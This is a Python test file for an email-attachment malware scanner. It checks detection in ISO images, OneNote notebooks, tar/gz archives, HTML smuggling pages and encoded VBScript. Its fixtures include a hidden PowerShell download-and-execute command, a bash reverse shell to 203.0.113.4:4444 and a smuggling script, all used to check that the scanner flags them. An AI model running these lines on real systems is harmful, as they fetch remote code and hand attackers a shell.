"""Upgrade #4 (30 Oct): files hidden inside disk images (.iso), OneNote notebooks, tar / gz files and web pages, and the
new upload types of the Malware Detection card. Everything is built in memory; nothing runnable is written to disk
except tiny harmless test bytes (like the older tests do)."""
import base64
import gzip
import hashlib
import io
import struct
import tarfile
import zlib

import pytest

from app.detectors import container_files as C
from app.email_pipeline.attachments import EICAR, container_members, scan_attachments
from app.email_pipeline.schemas import Attachment

# A real ISO made by pycdlib (ISO 9660 + Joliet long names, one sub-folder): readme.txt, setup.exe and
# DOCS/Invoice.pdf.lnk - the two "programs" are just b"MZ" + filler bytes, nothing runnable.
REAL_ISO = zlib.decompress(base64.b64decode(
    "eNrt3V1v01YYAOA3qBfRym5Gh6aKFndoCNAITqBIEzdDSSZVgrUa3YS4CySoFaFFbQfrDT+gV/s9/XPj2G5XtWVNpw6GwvM41rGP"
    "X+fDifTqnNjHEQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABArd3J82YtsjPaf76rh4oTXjc9ijnq9bhYVV2cOthcVn0b"
    "l6q1S1Evinq8/WLm69tTcW5//4z/1dJ2uz9cfZpda1/PWnlz/mYrb+VZe2VjdTN70Bv21p4NtrYGY/Nx06e728xbP7Sa881Wnudx"
    "rCI/4niEH+3nTtLhk3FuL/9HdsbpSP7/7lb31Pl/uqqa/uZg83SV/2ertdl/yv9nftems01LsR3t6McwVuNpWr+W1q6nshV5NGM+"
    "bpZLxZylLSuxkeI20/KD6KV9erEWz2IQW2kafLD3+N8Fyf/I/4yRv/bzPwAAADC2auV/7EX7fyJmyqXOYvuR4wIAAADj1f6P4vz6"
    "WtH+T2aipv0PAAAA49f+n93rBajH5WqpE4vRDn0AAAAAMEbt/yjG16lFNcTO5eICAO1/AAAAGC+jx9gfGVG7Wo4cEMXVA++NmCgv"
    "KWjsDxKcTVbl5F5UVFHnf+ne7zzsNpYfL99rxvcxV0XN7Zbhk7uHoycfdZd/XWp0H3dTMADwL/P/ybn7NPm/EVeqiCs7F4riws7h"
    "XP3lws+/LS60u42lzk+yNQB8Cvl/1D12RkbUbpRXDkRx9sB7I+p/n1Jwd0QfwFRsxCB60Y+XqWzEVvyR5jsj+gK+is3yJjK/x6u0"
    "zyDtM/DFAsCJ+f/k3H2a/P/jiPb/bCzEWryO9Vgtb/fWSHm6H89TOUz1L3wJAPCRrQyGw/XszfrGsO9gAMBn4uETxwAAAADGv/3/"
    "JwAAAADwwemLBD6udzz0b4g="))


def tiny_iso(files: dict) -> bytes:
    """Minimal ISO 9660 image (no Joliet) with the given files in the root folder."""
    def rec(lba, size, flags, name):           # one directory record (ECMA-119 9.1)
        body = (b"\x00" + struct.pack("<I", lba) + struct.pack(">I", lba) + struct.pack("<I", size)
                + struct.pack(">I", size) + bytes(7) + bytes([flags, 0, 0]) + struct.pack("<H", 1) + struct.pack(">H", 1)
                + bytes([len(name)]) + name)
        if (1 + len(body)) % 2:
            body += b"\x00"
        return bytes([1 + len(body)]) + body
    data_lba = 19
    recs, blobs = [rec(18, 2048, 2, b"\x00"), rec(18, 2048, 2, b"\x01")], []
    for name, blob in files.items():
        recs.append(rec(data_lba, len(blob), 0, name.encode() + b";1"))
        blobs.append(blob + b"\x00" * (-len(blob) % 2048))
        data_lba += (len(blob) + 2047) // 2048
    pvd = bytearray(2048)
    pvd[0:7] = b"\x01CD001\x01"
    pvd[156:156 + 34] = rec(18, 2048, 2, b"\x00")
    term = bytearray(2048)
    term[0:7] = b"\xffCD001\x01"
    root = b"".join(recs).ljust(2048, b"\x00")
    return b"\x00" * (16 * 2048) + bytes(pvd) + bytes(term) + root + b"".join(blobs)


def scan(name, data):
    a = Attachment(filename=name, content_type="application/octet-stream", size=len(data),
                   sha256=hashlib.sha256(data).hexdigest(), data=data)
    return scan_attachments([a], network=False)


def labels(r):
    return [i["label"] for i in r["indicators"] if i["triggered"]]


# ---- disk images -------------------------------------------------------------------------------------------------
def test_real_iso_with_joliet_names_and_folders_is_read():
    files = dict(C.iso_files(REAL_ISO))
    assert set(files) == {"readme.txt", "setup.exe", "DOCS/Invoice.pdf.lnk"}
    assert files["readme.txt"] == b"hello world" and files["setup.exe"][:2] == b"MZ"


def test_iso_with_a_disguised_shortcut_is_high_risk():
    r = scan("Invoice_2026.iso", REAL_ISO)
    lb = labels(r)
    assert r["riskScore"] >= 71
    assert any(x.startswith("Disguised file inside archive") for x in lb)
    assert any(x.startswith("Dangerous file inside archive") for x in lb)


def test_tiny_iso_builder_and_eicar_inside_an_iso():
    iso = tiny_iso({"README.TXT": b"hello", "EICAR.COM": EICAR})
    assert dict(C.iso_files(iso))["README.TXT"] == b"hello"
    assert scan("test.iso", iso)["riskScore"] >= 71


def test_not_an_iso_and_broken_isos_are_safe():
    assert C.iso_files(b"hello") == [] and not C.is_iso(b"\x00" * 40000)
    broken = bytearray(tiny_iso({"A.TXT": b"x"}))
    broken[16 * 2048 + 156 + 2:16 * 2048 + 156 + 6] = struct.pack("<I", 10 ** 9)    # root folder far past the end
    assert C.iso_files(bytes(broken)) == []


# ---- OneNote -----------------------------------------------------------------------------------------------------
def _one(*blobs):
    out = C.ONENOTE_MAGIC + b"\x00" * 200
    for b in blobs:
        out += C.ONENOTE_FILEDATA + struct.pack("<Q", len(b)) + b"\x00" * 12 + b + b"\x00" * 16
    return out


def test_onenote_with_a_hidden_script_is_flagged():
    hta = (b'<html><head><hta:application id="x"/></head><script language="VBScript">CreateObject("WScript.Shell")'
           b'.Run "powershell -w hidden -c iwr http://203.0.113.9/a.ps1 | ie' + b'x", 0</script></html>')
    r = scan("Invoice.one", _one(b"\x89PNG\r\n\x1a\n" + b"\x00" * 50, hta))
    assert r["riskScore"] >= 71 and any("Inside archive: Script" in x for x in labels(r))


def test_onenote_with_only_pictures_is_not_flagged():
    r = scan("Lecture notes.one", _one(b"\x89PNG\r\n\x1a\n" + b"\x00" * 300, b"\xff\xd8\xff\xe0" + b"\x00" * 300))
    assert r["riskScore"] == 0


# ---- tar / gz ----------------------------------------------------------------------------------------------------
def test_tar_gz_with_a_disguised_program_and_a_reverse_shell():
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w:gz") as t:
        for n, d in (("docs/photo.jpg.exe", b"MZ" + b"\x90" * 100),
                     ("run.sh", b"#!/bin/sh\nbash -i >& /dev/" + b"tcp/203.0.113.4/4444 0>&1\n")):
            ti = tarfile.TarInfo(n)
            ti.size = len(d)
            t.addfile(ti, io.BytesIO(d))
    lb = labels(scan("backup.tar.gz", b.getvalue()))
    assert any(x.startswith("Disguised file inside archive") for x in lb)
    assert any("reverse shell" in x for x in lb)


def test_gz_keeps_the_original_file_name():
    g = io.BytesIO()
    with gzip.GzipFile(filename="invoice.pdf.exe", mode="wb", fileobj=g) as f:
        f.write(b"MZ" + b"\x00" * 100)
    assert container_members(g.getvalue(), "invoice.gz")[1][0][0] == "invoice.pdf.exe"
    assert scan("invoice.gz", g.getvalue())["riskScore"] >= 71
    plain = gzip.compress(b"just some text")
    assert container_members(plain, "notes.txt.gz")[1][0][0] == "notes.txt"
    assert scan("notes.txt.gz", plain)["riskScore"] == 0


def test_rar_and_7z_are_accepted_but_said_to_be_unread():
    lb = labels(scan("files.rar", b"Rar!\x1a\x07\x01\x00" + b"\x00" * 100))
    assert lb and lb[0].startswith("Archive attachment (not inspected)")


# ---- web pages and encoded scripts ---------------------------------------------------------------------------------
def test_html_smuggling_page():
    html = (b'<html><script>var d=atob("TVqQAAMAAAAEAAAA");var b=new Blob([new Uint8Array([77,90])]);'
            b'var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click();'
            b'</script></html>')
    r = scan("Invoice.html", html)
    assert r["riskScore"] >= 71 and any("HTML smuggling" in x for x in labels(r))


def test_ordinary_web_page_is_not_smuggling():
    page = b"<html><body><h1>Results</h1><a href='results.pdf' download>Download PDF</a></body></html>"
    assert not any("smuggling" in x for x in labels(scan("results.html", page)))


def test_script_encoder_vbe():
    r = scan("doc.vbe", b"#@~^GAAAAA==@#@&?DNP4kCO.m]f~(BUKsVGJ*a@#@&eQcAAA==^#~@")
    assert r["riskScore"] >= 71 and any("Script Encoder" in x for x in labels(r))


# ---- the Malware Detection card ----------------------------------------------------------------------------------
@pytest.mark.parametrize("name", ["setup.iso", "Invoice.one", "files.rar", "files.7z", "page.html", "run.vbe",
                                  "payload.wsf", "backup.tar", "notes.gz", "old.com"])
def test_new_file_types_are_accepted_by_the_malware_card(auth_client, name):
    data = {"page.html": b"<html><body>hello</body></html>", "run.vbe": b"WScript.Echo 1",
            "payload.wsf": b"<job><script language='VBScript'>WScript.Echo 1</script></job>"}.get(name, b"\x00" * 64)
    r = auth_client.post("/api/analysis/scan", data={"moduleId": "cyber-threat", "subtopicId": "malware-detection",
                                                      "subtopicTitle": "Malware Detection"},
                         files={"file": (name, io.BytesIO(data), "application/octet-stream")})
    assert r.status_code == 200, r.text
    assert "Malware Engine" in r.json()["analysisEngine"]


def test_scripts_and_eicar_txt_go_to_the_malware_checks_not_the_log_reader(tmp_path):
    from app.services import analysis_service, subtopic_router
    p = tmp_path / "upload.ps1"
    p.write_bytes(b"Write-Host 'hello'")
    assert subtopic_router.cyber_file_kind(str(p), "update.ps1") == "script"
    assert subtopic_router.file_kind(str(p), "update.ps1") == "text"            # other modules unchanged
    t = tmp_path / "upload.txt"
    t.write_bytes(b"lecture notes")
    assert subtopic_router.cyber_file_kind(str(t), "notes.txt") == "text"
    # on the Malware Detection card every upload gets the malware checks, e.g. the EICAR test saved as .txt
    r = analysis_service.run_scan(module_id="cyber-threat", subtopic_id="malware-detection",
                                  subtopic_title="Malware Detection", text_input=None, url_input=None,
                                  file_path=str(t), file_name="notes.txt", extra_field_values={})
    assert "Malware Engine" in r["analysisEngine"] and r["riskScore"] < 26
    c = subtopic_router.classify(module_id="cyber-threat", text_input=None, url_input=None, file_path=str(p),
                                 file_name="update.ps1", extra_field_values=None)
    assert c.subtopic_id == "malware-detection"


def test_programs_inside_an_iso_are_judged_by_the_malware_model():
    pytest.importorskip("pefile")
    from app.detectors import malware as M
    from test_malware import _launcher
    exe = _launcher("w64.exe")
    targets, _ = M._targets("setup.iso", tiny_iso({"SETUP.EXE": exe, "README.TXT": b"hi"}))
    assert [(n, t) for n, _, t in targets] == [("setup.iso > SETUP.EXE", "Win64")]
